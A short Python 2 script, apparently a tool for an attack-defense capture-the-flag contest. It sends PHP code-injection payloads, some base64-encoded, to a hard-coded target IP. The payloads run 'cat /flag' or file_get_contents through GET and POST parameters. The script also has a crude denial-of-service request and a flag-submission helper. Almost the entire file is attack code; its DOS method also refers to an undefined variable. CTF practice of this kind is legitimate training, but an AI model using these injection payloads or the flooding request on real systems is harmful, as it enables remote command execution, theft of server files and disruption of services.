#-*- coding: utf-8 -*-
import requests
import hackhttp
import thread_pool
from setting import PATTERN,SUBMIT_URL
import re

def submitflag(flag):
    requests.get(SUBMIT_URL+flag)

class Obfsing():
    def __init__(self,url):
        self.url = url
        self.sess = requests.session()
        self.hh = hackhttp.hackhttp(hackhttp.httpconpool())
        self.tp = thread_pool.ThreadPool(500)
        self.headers = headers_dict = {
            'X-Forwarder-For': '192.168.1.1',
        }

    def obfs(self):
        print '[*]Obfsing '+self.url
        gets = ["/?token=highlight_file(%22/flag%22);","/?batch=c3lzdGVtKCJjYXQgL2ZsYWciKTs=","/?q=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=","/?file=print_r(file_get_contents(%22/flag%22));"]
        posts = [('/','ajax_html_ids=c3lzdGVtKCJjYXQgL2ZsYWciKTs='),('/','nid=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7')]
        for g in gets:
            code, _, _, _, _ = self.hh.http(self.url+g)
            print code
        for p in posts:
            code, _, _, _, _ = self.hh.http(self.url+p[0],post = p[1])
            print code

    def DOS(self):
        print '[*]DOSing '+self.url
        requests.get(url+'/index.php?id='+'A'*0x1000,timeout=2)
    #huasir


def O():
    targets = ['http://192.168.221.132']
    for tt in targets:
        BB = Obfsing(tt)
        BB.obfs()

def main():
    O()

if __name__ == '__main__':
    main()